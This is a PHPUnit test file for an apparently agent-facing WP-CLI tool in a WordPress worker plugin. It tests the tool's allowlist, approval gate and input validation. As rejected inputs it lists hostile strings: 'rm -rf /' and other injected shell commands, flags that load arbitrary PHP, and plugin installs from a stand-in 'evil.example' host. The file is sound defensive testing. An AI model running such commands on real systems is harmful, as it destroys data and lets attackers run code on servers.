<?php
/**
 * Tests for Aura_Power_Tool_Wp_Cli — allowlist, shell-metacharacter rejection,
 * and the default-off execution gate. The tool is left disabled (constant unset)
 * so no WP-CLI process is ever spawned in CI.
 *
 * @package Aura_Worker\Tests
 */

use PHPUnit\Framework\TestCase;

final class WpCliTest extends TestCase {

	private Aura_Power_Tool_Wp_Cli $tool;

	protected function setUp(): void {
		sa_reset_state();
		$this->tool = new Aura_Power_Tool_Wp_Cli();
	}

	public function test_requires_approval(): void {
		$this->assertTrue( $this->tool->get_annotations()['requires_approval'] );
	}

	public function test_execution_disabled_without_constant(): void {
		$result = $this->tool->execute( array( 'command' => 'plugin list' ) );
		$this->assertStringContainsString( 'disabled', $result['error'] );
	}

	public function test_dry_run_allows_a_safe_command(): void {
		$preview = $this->tool->dry_run( array( 'command' => 'plugin list --status=active' ) );
		$this->assertTrue( $preview['allowed'] );
		$this->assertNull( $preview['reason'] );
		$this->assertContains( '--allow-root', $preview['argv'] );
		$this->assertFalse( $preview['enabled'] );
	}

	public function test_dry_run_rejects_disallowed_family(): void {
		foreach ( array( 'eval "phpinfo();"', 'db query "SELECT 1"', 'config get', 'shell' ) as $cmd ) {
			$preview = $this->tool->dry_run( array( 'command' => $cmd ) );
			$this->assertFalse( $preview['allowed'], $cmd );
		}
	}

	public function test_dry_run_rejects_denied_subcommand(): void {
		$preview = $this->tool->dry_run( array( 'command' => 'plugin install akismet' ) );
		$this->assertFalse( $preview['allowed'] );
		$this->assertStringContainsString( 'plugin install', $preview['reason'] );
	}

	public function test_rejects_shell_metacharacters(): void {
		foreach ( array( 'plugin list; rm -rf /', 'plugin list | cat', 'plugin list && whoami', 'plugin list `id`', 'plugin list $(id)' ) as $cmd ) {
			$preview = $this->tool->dry_run( array( 'command' => $cmd ) );
			$this->assertFalse( $preview['allowed'], $cmd );
			$this->assertStringContainsString( 'metacharacter', $preview['reason'] );
		}
	}

	public function test_empty_command_rejected(): void {
		$preview = $this->tool->dry_run( array( 'command' => '   ' ) );
		$this->assertFalse( $preview['allowed'] );
	}

	public function test_rejects_dangerous_global_flags(): void {
		// WP-CLI runtime flags that load/run code — must be refused even though
		// they contain no shell metacharacter.
		// Metacharacter-free so these exercise the flag allowlist specifically
		// (values with ; ( ) " would be caught by the metachar rule instead — also
		// safe, just a different message).
		foreach ( array(
			'option get siteurl --require=/var/www/html/wp-content/uploads/x.php',
			'plugin list --exec=phpinfo',
			'core version --ssh=user@host',
			'option get home --path=/etc',
			'plugin list --http=example.com',
		) as $cmd ) {
			$preview = $this->tool->dry_run( array( 'command' => $cmd ) );
			$this->assertFalse( $preview['allowed'], $cmd );
			$this->assertStringContainsString( 'flag', $preview['reason'] );
		}
	}

	public function test_allows_safe_flags(): void {
		$preview = $this->tool->dry_run( array( 'command' => 'plugin list --status=active --format=json' ) );
		$this->assertTrue( $preview['allowed'] );
	}

	public function test_destructive_annotation(): void {
		$this->assertTrue( $this->tool->get_annotations()['destructive'] );
	}

	public function test_flag_injection_cannot_bypass_denylist(): void {
		// Inserting a safe flag between the family and the real subcommand must
		// NOT shift `install`/`download`/`update` out of the deny check.
		foreach ( array(
			'plugin --skip-plugins install http://evil.example/x.zip',
			'theme --skip-themes install http://evil.example/t.zip',
			'core --quiet download',
			'core --quiet update',
		) as $cmd ) {
			$preview = $this->tool->dry_run( array( 'command' => $cmd ) );
			$this->assertFalse( $preview['allowed'], $cmd );
			$this->assertStringContainsString( 'not permitted', $preview['reason'] );
		}
	}

	public function test_rejects_unknown_single_dash_flag(): void {
		$preview = $this->tool->dry_run( array( 'command' => 'plugin list -e' ) );
		$this->assertFalse( $preview['allowed'] );
		$this->assertStringContainsString( 'flag', $preview['reason'] );
	}

	public function test_command_of_only_flags_has_no_subcommand(): void {
		$preview = $this->tool->dry_run( array( 'command' => '--status=active' ) );
		$this->assertFalse( $preview['allowed'] );
	}

	public function test_denies_credential_and_import_subcommands(): void {
		foreach ( array( 'user application-password create 1', 'media import /tmp/x.jpg' ) as $cmd ) {
			$preview = $this->tool->dry_run( array( 'command' => $cmd ) );
			$this->assertFalse( $preview['allowed'], $cmd );
			$this->assertStringContainsString( 'not permitted', $preview['reason'] );
		}
	}
}
